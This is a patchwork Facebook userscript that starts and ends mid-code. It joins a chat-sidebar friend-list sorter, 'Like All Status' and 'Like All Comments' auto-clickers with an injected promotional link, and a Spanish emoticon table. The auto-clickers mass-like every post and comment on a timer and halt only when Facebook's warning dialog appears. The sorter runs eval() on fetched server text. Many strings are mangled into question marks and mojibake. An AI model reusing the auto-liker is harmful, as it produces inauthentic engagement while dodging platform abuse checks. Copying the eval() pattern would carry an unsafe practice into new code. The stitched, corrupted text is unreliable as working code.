						w.localStorage.setItem('order' + f.item(i-1).id,i);
					}else{
						w.localStorage.setItem('order' + f.item(i).id,i);
					}
				}
				w.render_chat();
			};

			w.Arbiter.subscribe('sidebar/initialized',function(a,d){
				d.isViewportCapable = function(){ return false; };
				d.disable();
			});

			w.Env = w.require('Env');

			w.Arbiter.subscribe('buddylist-nub/initialized',function(a,c){
				var av = w.require('AvailableList'),
					sp = w.require('ShortProfiles'),
					tl = w.require('Toggler'),
					oa = w.require('debounceAcrossTransitions');

				var getAvailableList = function(){
					return av.getAvailableIDs().filter(function(r){
						switch(av.get(r)){
							case av.ACTIVE: return settings.Online;
							case av.IDLE: return settings.Idle;
							default: return false;
						}
					});
				};

				var sortAlpha = function(x,y){
					var r = sp.getNow(x), s = sp.getNow(y);
					if(!r || !s) return 0;
					var t = r.name.toLowerCase(),
						u = s.name.toLowerCase();
					return t < u ? -1 : 1;
				};

				var sortLists = function(x,y){
					if(!x.member || !y.member) return 0;
					var r = Number(w.localStorage.getItem('order' + x.uid)),
						s = Number(w.localStorage.getItem('order' + y.uid));
					if(r === s) return 0;
					return r < s ? -1 : 1;
				};

				w.render_chat = c.orderedList.render = function(){
					this.render = oa(function(){
						if(!rocki.lists) return setTimeout(this.render.bind(this),300);
						var a = getAvailableList(), b = [], c, d, e = {};
						rocki.lists.sort(sortLists);
						if(a.length > 0){
							a.sort(sortAlpha);
							for(var f = 0, g = rocki.lists.length; f < g; f++){
								if(!rocki.lists[f].member) return setTimeout(this.render.bind(this),300);
								c = a.filter(function(r){ return rocki.lists[f].member.hasOwnProperty(r); });
								if(c.length > 0){
									b.push('<li class="separator" id="' + rocki.lists[f].uid + '" onclick="toggle_list(\'' + rocki.lists[f].uid + '\');"><div class="outer"><div class="inner"><span class="text">' +
										rocki.lists[f].text + ' (' + c.length + ') <a href="#" onclick="change_order(\'' + rocki.lists[f].uid + '\');return false;">+</a> <a href="#" onclick="requireLazy([\'Dialog\'],function(a){new a().setAsyncURL(\'/ajax/choose/?type=friendlist&flid=' + rocki.lists[f].uid + '\').setAutohide(true).show();});return false;">~</a></span><div class="dive"><span class="bar"></span></div></div></div></li>');

									if(!w.localStorage.getItem('toggle' + rocki.lists[f].uid)){	
										for(var k = 0, l = c.length; k < l; k++){
											if(d = this._getListItem(c[k])){
												d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
												b.push(d); e[c[k]] = 1;
											}else{
												this._renderListItem(c[k],this.render.bind(this));
											}
										}
									}
								}
							}
							c = a.filter(function(r){ return !e.hasOwnProperty(r); });
							if(c.length > 0){
								b.push('<li class="separator" onclick="toggle_list(\'other\');"><div class="outer"><div class="inner"><span class="text">' +
									'Other (' + c.length + ')</span><div class="dive"><span class="bar"></span></div></div></div></li>');

								if(!w.localStorage.getItem('toggleother')){
									for(var k = 0, l = c.length; k < l; k++){
										if(d = this._getListItem(c[k])){
											d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
											b.push(d);
										}else{
											this._renderListItem(c[k],this.render.bind(this));
										}
									}
								}
							}
							if(settings.Mobile){
								c = av.getAvailableIDs().filter(function(r){ return av.get(r) === av.MOBILE && w.PresencePrivacy.getFriendVisibility(r) !== w.PresencePrivacy.BLACKLISTED; });
								if(c.length > 0){
									b.push('<li class="separator" onclick="toggle_list(\'mobile\');"><div class="outer"><div class="inner"><span class="text">' +
										'Mobile (' + c.length + ')</span><div class="dive"><span class="bar"></span></div></div></div></li>');
	
									if(!w.localStorage.getItem('togglemobile')){
										c.sort(sortAlpha);
										for(var k = 0, l = c.length; k < l; k++){
											if(d = this._getListItem(c[k])){
												d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
												b.push(d);
											}else{
												this._renderListItem(c[k],this.render.bind(this));
											}
										}
									}
								}
							}
						}else{
							b.push('<div style="padding:10px;">No friends online :(</div>');
						}
						if(b.length > 0){
							var ul = this._root.firstChild;
							ul.innerHTML = '';
							for(var s = 0, t = b.length; s < t; s++){
								if(typeof b[s] === 'string'){
									ul.innerHTML += b[s];
								}else{
									ul.appendChild(b[s]);
								}
							}
							this.inform('render',{},this.BEHAVIOR_PERSISTENT);
						}
					}.bind(this),300,false);
					this.render();
				}.bind(c.orderedList);

				w.Arbiter.subscribe('sidebar/show',function(a,d){
					d.hide();
					c.show();
				});

				tl.createInstance(c.root).setSticky(settings.Sticky);

				c.orderedList.scrollTo = function(){ return false; };

				c.orderedList.subscribe('render',function(){
					c.label.innerHTML =
						c.root.querySelector('div.titlebarTextWrapper').innerHTML =
							'Chat (<strong>' + getAvailableList().length + '</strong>)';
				});

				var menu = d.querySelector('div.fbNubFlyoutTitlebar div.fbChatSidebarDropdown ul.uiMenuInner');
				menu.innerHTML = '<li data-label="Manage Lists" class="uiMenuItem"><a aria-checked="false" href="/bookmarks/lists" tabindex="-1" class="itemAnchor"><span class="itemLabel fsm">Manage Lists</span></a></li>' + menu.innerHTML;

				w.localStorage.setItem('togglemobile',true);

				if(w.ChatVisibility.isOnline() && settings.Onload) c.show();
			});
		},

		'getflid':function(){
			if(!w.Env) return setTimeout(this.getflid.bind(this),30);
			var a = new ajax('/ajax/typeahead/first_degree.php?__a=1&filter[0]=friendlist&lazy=0&viewer=' + w.Env.user + '&__user=' + w.Env.user);
			a.send('GET',null,function(b){
				var typeahead = eval('(' + b.responseText.substr(9) + ')');
				if(!!typeahead.payload){
					this.lists = typeahead.payload.entries;
					this.getmember();
				}
			}.bind(this));
		},

		'getmember':function(){
			var regex = /\\?"(\d+)\\?":1/g, a;
			for(var i = 0, j = this.lists.length; i < j; i++){
				a = new ajax('/ajax/choose/?type=friendlist&flid=' + this.lists[i].uid + '&view=all&__a=1&__d=1&__user=' + w.Env.user);
				a.send('GET',null,function(b,c){
					var d; this.lists[c].member = {};
					while(d = regex.exec(b.responseText)){
						this.lists[c].member[d[1]] = 1;
					}
				}.bind(this,a.XMLHttpRequest,i));
			}
		}
	};

	if(w && w.Arbiter){
		util.insertRule('\
		.fbDock {\
		margin:' + settings.Margin + '!important;\
		}\
		#fbDockChatBuddylistNub {\
		width:' + settings.Width + '!important;\
		}\
		.fbNubFlyout {\
		min-height:' + settings.MinHeight + '!important;\
		}\
		.fbChatOrderedList .separator {\
			float: left;\
			width: 100%;\
		}\
		.fbChatOrderedList .separator {\
			-moz-user-select: none;\
			display: table;\
			height: 32px;\
		}\
		.fbChatOrderedList .separator .outer {\
			display: table-cell;\
			vertical-align: middle;\
		}\
		.fbChatOrderedList .separator .outer .inner {\
			cursor: pointer;\
			position: relative;\
			text-align: center;\
			top: -50%;\
			z-index: 1;\
		}\
		.fbChatOrderedList .separator .text {\
			background-color: #FFFFFF;\
			color: #989DB3;\
			display: inline-block;\
			font-size: 9px;\
			font-weight: bold;\
			padding: 0 5px;\
			text-transform: uppercase;\
		}\
		.fbChatOrderedList .separator .dive {\
			left: 0;\
			position: absolute;\
			top: 50%;\
			width: 100%;\
			z-index: -1;\
		}\
		.fbChatOrderedList .separator .dive .bar {\
			border-bottom: 2px solid #CCD0DA;\
			display: block;\
			margin: 0 5px;\
		}\
		');

		rocki.DOMContentLoaded();
		rocki.getflid();
	}

});

}



















if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+69px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#3B5998";
 div.style.border = "2.5px solid #585858";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#F5F5F5' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?¢â‚¬â„¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#F5F5F5' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(1700)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(1000);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="133px";
    div.style.opacity=.9;
    div.style.bottom="+157px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7000F";
    div.style.border="2.5px solid #585858";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#F5F5F5' href='http://www.facebook.com/info.44.you' target='_blank' title='SADmalk' ><blink><center>Info 4 you</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+48px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#3B5998";
 div.style.border = "2.5px solid #585858";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#F5F5F5' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?¢â‚¬â„¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#F5F5F5' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(1700)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(1000);
    B++
   }
  }
  C()
 }
}


(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Emoticones");
	// = Data =======
	// Emoticon data; 
	var emoticons = [ { // Text to picture emoticons
		"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Sonriente"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Triste"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Lengua afuera"
	}, {
		"chars" : " =D ",
		"class" : "emoticon_grin",
		"name" : "Reir"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Asombrado"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Guiño"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gruñón"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Inseguro"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Llorando"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Lentes"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Gafas de sol"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Corazón"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Demonio"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Ángel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Bizco"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confundido"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Alterado"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Dudando"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Me gusta"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Beso"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Tiburón"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Pingüino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Mierda"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Sombrilla cerrada"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Ola de mar"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Luna cuarto creciente"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Estrella brillante"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Semillero"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Mata de palma"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Captus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulipán"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Flor de cereza"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rosa"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayena"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Girasol"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Espiga de arroz"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Trébol de cuatro hojas"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Hoja de arce"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Hoja caída"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Hoja flotando en el viento"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Mandarina"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Manzana roja"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Fresa"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Hamburguesa"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Copa de cóctel"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Jarra de cerveza"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Regalo envuelto"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Calabaza con vela"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Árbol de navidad"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Padre en navidad"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Globo"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Corchete de fiesta"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pino de decoración"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Muñecas japonesas"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Serpentina de carpas"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Carrillón de viento"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Gorro de graduación"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Nota musical"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Múltiples notas musicales"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Partitura musical"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Serpiente"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Caballo"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Oveja"
        }, {
		"chars" : " \ud83d\udc36 ",
		"class" : "_1az _1a- _491",
		"name" : "Perro"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Mono"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Gallina"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Jabalí"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elefante"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Pulpo"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Concha de caracol"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insecto"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Pez"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Pez tropical"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pez globo"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Pollito de frente"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Ave"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Pingüino"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Perro de lanas"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Camello bactriano"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Delfín"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Cara de ratón"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cara de vaca"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Cara de conejo"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cara de gato"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Ballena escupiendo agua"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Cara de caballo"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Cara de mono"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Cara de cerdo"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Cara de rana"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Cara de hamster"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Cara de lobo"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Cara de oso"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Huellas"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Ojos"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Oreja"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nariz"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Boca"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Lengua"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "Mano blanca indicando hacia arriba"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "Mano blanca indicando hacia abajo"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "Mano blanca indicando hacia la izquierda"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "Mano blanca indicando hacia la derecha"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Puño"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Mano en movimiento"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Mano indicando todo bien"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Mano con pulgar arriba"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Mano con pulgar abajo"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Manos aplaudiendo"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Manos abiertas"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Chico"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Chica"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Hombre"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Mujer"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Hombre y mujer agarrados de las manos"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Oficial de policía"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Mujer con orejas de conejo"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Persona con pelo rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Hombre con gua pi mao"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Hombre con turbante"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Hombre viejo"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Mujer vieja"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Bebé"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Trabajador de construcción"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princesa"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Fantasma"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Ángel bebé"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Extraterrestre"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Monstruo Extraterrestre"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Diablillo"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Cráneo"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guardia"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Bailarina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Esmalte de uñas"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Marca de beso"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Beso pareja"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Ramo de flores"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Pareja con corazón"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Corazón latiendo"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Corazón roto"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Corazón brillante"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Corazón creciente"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Corazón con flecha"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Corazón azul"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Corazón verde"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Corazón amarillo"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Corazón morado"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Corazón con lazo"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Símbolo de enojo"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Durmiendo"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Símbolo de gotas de sudor"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Símbolo de arranque rápido"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pila de cacá"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Bícep flexionado"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
